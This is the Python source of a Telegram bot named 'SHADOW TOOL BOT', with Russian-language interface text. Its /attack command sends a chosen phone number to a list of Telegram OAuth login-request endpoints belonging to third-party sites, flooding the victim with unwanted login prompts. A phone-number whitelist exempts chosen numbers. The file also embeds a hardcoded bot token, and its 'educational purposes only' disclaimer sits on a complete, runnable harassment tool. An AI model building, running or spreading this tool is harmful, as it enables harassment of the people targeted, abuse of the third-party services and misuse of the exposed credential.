import telebot
import requests
import time
import json
import os

BOT_TOKEN = '8768938960:AAGe5Pwh32P13XbwzXj7fzl5DVhYJLEIj0w'
bot = telebot.TeleBot(BOT_TOKEN)

WHITELIST_FILE = 'whitelist.json'

ATTACK_URLS = [
    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1',
    'https://translations.telegram.org/auth/request',
    'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz',
    'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1'
]

def load_whitelist():
    if os.path.exists(WHITELIST_FILE):
        with open(WHITELIST_FILE, 'r') as f:
            return json.load(f)
    return []

def save_whitelist(whitelist):
    with open(WHITELIST_FILE, 'w') as f:
        json.dump(whitelist, f, indent=2)

whitelist = load_whitelist()

def normalize_phone(phone):
    clean = ''.join(filter(str.isdigit, phone))
    if clean.startswith('8'):
        clean = '7' + clean[1:]
    if len(clean) == 10:
        clean = '7' + clean
    if not clean.startswith('+'):
        clean = '+' + clean
    return clean

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, 
        "🔮 SHADOW TOOL BOT 🔮\n\n"
        "📌 Команды:\n"
        "/attack +79001234567 - начать атаку\n"
        "/add +79001234567 - добавить в белый список\n"
        "/remove +79001234567 - удалить из белого списка\n"
        "/list - показать белый список\n"
        "/help - помощь\n\n"
        "⚡ AUTHOR: AMNESIA")

@bot.message_handler(commands=['help'])
def help_cmd(message):
    bot.reply_to(message,
        "📖 ИНСТРУКЦИЯ:\n\n"
        "1. Добавь номер в белый список: /add +79001234567\n"
        "2. Защищённые номера НЕ атакуются\n"
        "3. Атака: /attack +79001234567\n\n"
        "⚠️ Только для образовательных целей!")

@bot.message_handler(commands=['add'])
def add_to_whitelist(message):
    global whitelist
    try:
        phone = message.text.split()[1]
        normalized = normalize_phone(phone)
        if normalized not in whitelist:
            whitelist.append(normalized)
            save_whitelist(whitelist)
            bot.reply_to(message, f"✅ Номер {normalized} добавлен в белый список!")
        else:
            bot.reply_to(message, f"⚠️ Номер {normalized} уже в белом списке!")
    except:
        bot.reply_to(message, "❌ Используй: /add +79001234567")

@bot.message_handler(commands=['remove'])
def remove_from_whitelist(message):
    global whitelist
    try:
        phone = message.text.split()[1]
        normalized = normalize_phone(phone)
        if normalized in whitelist:
            whitelist.remove(normalized)
            save_whitelist(whitelist)
            bot.reply_to(message, f"✅ Номер {normalized} удалён из белого списка!")
        else:
            bot.reply_to(message, f"⚠️ Номер {normalized} не найден в белом списке!")
    except:
        bot.reply_to(message, "❌ Используй: /remove +79001234567")

@bot.message_handler(commands=['list'])
def show_whitelist(message):
    if whitelist:
        phones = '\n'.join(whitelist)
        bot.reply_to(message, f"📋 БЕЛЫЙ СПИСОК:\n{phones}")
    else:
        bot.reply_to(message, "📋 Белый список пуст")

@bot.message_handler(commands=['attack'])
def attack(message):
    try:
        phone = message.text.split()[1]
        normalized = normalize_phone(phone)
        
        if normalized in whitelist:
            bot.reply_to(message, f"⛔ АТАКА ОТМЕНЕНА!\nНомер {normalized} в белом списке!")
            return
        
        msg = bot.reply_to(message, f"🔥 АТАКА НА {normalized}...\n0/{len(ATTACK_URLS)}")
        
        sent = 0
        for i, url in enumerate(ATTACK_URLS):
            try:
                requests.post(url, data={'phone': normalized}, timeout=5)
                sent += 1
            except:
                sent += 1
            bot.edit_message_text(f"🔥 АТАКА НА {normalized}...\n{sent}/{len(ATTACK_URLS)}", message.chat.id, msg.message_id)
            time.sleep(0.3)
        
        bot.edit_message_text(f"🎯 АТАКА ЗАВЕРШЕНА!\nОтправлено: {sent}/{len(ATTACK_URLS)}\nНомер: {normalized}", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Используй: /attack +79001234567")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {str(e)}")

print("🤖 Бот запущен...")
bot.infinity_polling()
